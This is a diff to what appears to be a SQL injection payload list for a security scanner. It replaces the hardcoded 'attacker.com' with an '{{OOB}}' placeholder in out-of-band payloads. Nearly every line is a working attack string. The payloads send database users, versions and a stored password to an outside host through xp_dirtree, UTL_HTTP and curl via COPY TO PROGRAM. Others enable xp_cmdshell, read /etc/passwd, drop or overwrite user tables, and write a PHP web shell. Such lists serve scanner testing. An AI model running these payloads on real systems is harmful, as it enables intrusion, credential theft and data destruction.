@@ -192,7 +192,7 @@ EXP(~(SELECT * FROM (SELECT SLEEP(3))x))
 '; INSERT INTO users(username,password) VALUES('ws_test','ws_test')--
 '; UPDATE users SET password='pwned' WHERE 1=1--
 '; DROP TABLE users--
-'; EXEC master..xp_dirtree '\\attacker.com\x'--
+'; EXEC master..xp_dirtree '\\{{OOB}}\x'--
 '; EXEC sp_configure 'show advanced options',1--
 '; RECONFIGURE--
 '; INSERT INTO users(id,username,password) VALUES(9999,'wshack','wshack')--
@@ -227,7 +227,7 @@ EXP(~(SELECT * FROM (SELECT SLEEP(3))x))
 '; SELECT TOP 1 name FROM sys.tables--
 
 # ── ADVANCED PostgreSQL: COPY TO PROGRAM (RCE) ──
-'; COPY (SELECT version()) TO PROGRAM 'curl http://attacker.com/?x='||version()--
+'; COPY (SELECT version()) TO PROGRAM 'curl http://{{OOB}}/?x='||version()--
 '; CREATE TABLE ws_cmd(c text); COPY ws_cmd FROM PROGRAM 'id'; SELECT c FROM ws_cmd--
 '; SELECT pg_read_binary_file('/etc/passwd')--
 '; SELECT lo_import('/etc/passwd',1337)--
@@ -306,16 +306,16 @@ EXP(~(SELECT * FROM (SELECT SLEEP(3))x))
 ' AND (SELECT count(*) FROM(SELECT 1 UNION SELECT 2 UNION SELECT 3)x GROUP BY concat((SELECT database()),FLOOR(RAND(0)*2)) HAVING MIN(0))--
 
 # ── OOB: UTL_HTTP (Oracle) ──
-' AND 1=UTL_HTTP.REQUEST('http://attacker.com/'||(SELECT user FROM dual))--
-' UNION SELECT UTL_HTTP.REQUEST('http://attacker.com/?x='||user) FROM dual--
-'; BEGIN UTL_HTTP.REQUEST('http://attacker.com/?x='||user); END;--
-' AND 1=(SELECT UTL_HTTP.REQUEST('http://attacker.com/'||banner) FROM v$version WHERE rownum=1)--
+' AND 1=UTL_HTTP.REQUEST('http://{{OOB}}/'||(SELECT user FROM dual))--
+' UNION SELECT UTL_HTTP.REQUEST('http://{{OOB}}/?x='||user) FROM dual--
+'; BEGIN UTL_HTTP.REQUEST('http://{{OOB}}/?x='||user); END;--
+' AND 1=(SELECT UTL_HTTP.REQUEST('http://{{OOB}}/'||banner) FROM v$version WHERE rownum=1)--
 
 # ── OOB: xp_dirtree (MSSQL) ──
-'; EXEC master..xp_dirtree '\\attacker.com\a'--
-'; DECLARE @v varchar(1024); SET @v=(SELECT TOP 1 password FROM users); EXEC master..xp_dirtree '\\'+@v+'.attacker.com\a'--
-'; EXEC master..xp_fileexist '\\attacker.com\b'--
-'; EXEC master..xp_subdirs '\\attacker.com\c'--
+'; EXEC master..xp_dirtree '\\{{OOB}}\a'--
+'; DECLARE @v varchar(1024); SET @v=(SELECT TOP 1 password FROM users); EXEC master..xp_dirtree '\\'+@v+'.{{OOB}}\a'--
+'; EXEC master..xp_fileexist '\\{{OOB}}\b'--
+'; EXEC master..xp_subdirs '\\{{OOB}}\c'--
 
 # ── SECOND-ORDER INJECTION ──
 ws_so_' OR '1'='1
@@ -434,7 +434,7 @@ a"or"1"="1
 ' AND 1=CONVERT(int,(SELECT @@version))-- -
 '; EXEC xp_cmdshell('whoami')-- -
 '; EXEC sp_configure 'show advanced options',1;RECONFIGURE;EXEC sp_configure 'xp_cmdshell',1;RECONFIGURE-- -
-'; EXEC master..xp_dirtree '//attacker.com/a'-- -
+'; EXEC master..xp_dirtree '//{{OOB}}/a'-- -
 # Oracle
 ' AND 1=CTXSYS.DRITHSX.SN(1,(SELECT banner FROM v$version WHERE rownum=1))-- -
 ' AND 1=DBMS_PIPE.RECEIVE_MESSAGE('a',5)-- -
@@ -457,5 +457,5 @@ admin'/*
 admin' OR '1'='1'#
 " OR ""="
 # OOB / dosya yazma
-' AND (SELECT LOAD_FILE(CONCAT('\\\\',(SELECT version()),'.attacker.com\\a')))-- -
+' AND (SELECT LOAD_FILE(CONCAT('\\\\',(SELECT version()),'.{{OOB}}\\a')))-- -
 ' UNION SELECT '<?php system($_GET[c]);?>',NULL INTO OUTFILE '/var/www/html/s.php'-- -
